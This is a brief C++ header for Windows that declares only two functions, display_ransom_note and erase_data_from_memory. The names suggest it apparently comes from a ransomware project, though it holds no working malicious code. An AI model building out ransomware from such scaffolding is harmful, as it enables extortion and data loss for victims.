#pragma once
#include <Windows.h>
#include <tchar.h>
#include <vector>

void display_ransom_note();
void erase_data_from_memory(std::vector<BYTE>& data);